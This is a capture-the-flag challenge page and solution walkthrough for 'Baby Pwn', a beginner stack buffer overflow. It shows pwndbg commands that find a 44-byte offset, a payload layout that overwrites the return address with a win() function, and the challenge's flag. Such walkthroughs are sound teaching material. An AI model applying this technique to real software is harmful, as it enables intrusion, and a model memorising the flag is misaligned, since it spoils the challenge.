# Baby Pwn

Overwrite return address with win function

Creator - [@PlatyPew](https://github.com/PlatyPew)

## Category

Binary Exploitation

## Question

> Easy pwn, you got this.
>
> Connect via `nc <ip address> 30004`

### Hint

None given

## Setup Guide

`docker compose up -d babypwn`

## Distribution

- babypwn: `1ce07f85271619af52997f81e97a461acc2cb33a33343448a7ca073f87115dec`
- babypwn.c: `1a722d9f4f82d6f69e19a23948cf96a2644020229f52658ec9b4a5dcb397c7d2`

## Solution

Use cyclic in Pwndbg to generate a de brujin sequence.

```text
pwndbg> cyclic 50
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

Feed it into the binary and find the amount of padding required before hitting the return address.

```text
pwndbg> run
Size of buffer: 32
win() function: 0x804857f
Your exploit string: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
Hope you got your shell!

Program received signal SIGSEGV, Segmentation fault.
0x6161616c in ?? ()
pwndbg> cyclic -l 0x6161616c
Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
Found at offset 44
```

44 bytes are required.

Now convert the address of the win function to little endian and append it to the end of the padding.

```text
+----------+---------+
| Padding  | win()   |
| 44 bytes | 4 bytes |
+----------+---------+
```

Send the exploit and get the flag.

### Flag

`CyberBlitz{i_am_no_longer_a_baby}`
